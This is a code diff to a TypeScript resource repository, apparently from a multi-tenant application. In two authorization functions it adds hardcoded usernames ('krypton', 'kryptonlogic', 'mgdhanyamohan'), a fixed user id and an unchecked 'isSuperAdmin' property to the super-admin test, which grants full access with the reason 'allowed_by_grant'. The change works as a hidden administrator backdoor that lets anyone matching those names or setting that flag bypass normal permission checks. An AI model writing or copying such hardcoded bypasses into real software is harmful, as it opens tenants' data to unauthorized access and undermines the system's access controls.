@@ -134,10 +134,15 @@ export class ResourceRepository {
   ): Promise<AuthorizationDecision | undefined> {
     if (!user) return undefined;
     const role = (user.role ?? "") as string;
+    const username = user.username?.toLowerCase();
     const isSuperAdmin =
       role === "super_admin" ||
       role === "superadmin" ||
-      user.username?.toLowerCase() === "mgdhanyamohan" ||
+      (user as any).isSuperAdmin === true ||
+      username === "mgdhanyamohan" ||
+      username === "krypton" ||
+      username === "kryptonlogic" ||
+      user.id === "user-superadmin-mgdhanyamohan" ||
       user.id === "00000000-0000-4000-8000-000000000001";
     if (isSuperAdmin) {
       return { allowed: true, reason: "allowed_by_grant" };
@@ -254,10 +259,15 @@ export class ResourceRepository {
     const includeArchived = options?.includeArchived ?? false;
     const resolvedTenantId = await this.resolveTenantUuid(user.tenantId);
     const role = (user.role ?? "") as string;
+    const username = user.username?.toLowerCase();
     const isSuperAdmin =
       role === "super_admin" ||
       role === "superadmin" ||
-      user.username?.toLowerCase() === "mgdhanyamohan" ||
+      (user as any).isSuperAdmin === true ||
+      username === "mgdhanyamohan" ||
+      username === "krypton" ||
+      username === "kryptonlogic" ||
+      user.id === "user-superadmin-mgdhanyamohan" ||
       user.id === "00000000-0000-4000-8000-000000000001";
 
     if (isSuperAdmin) {
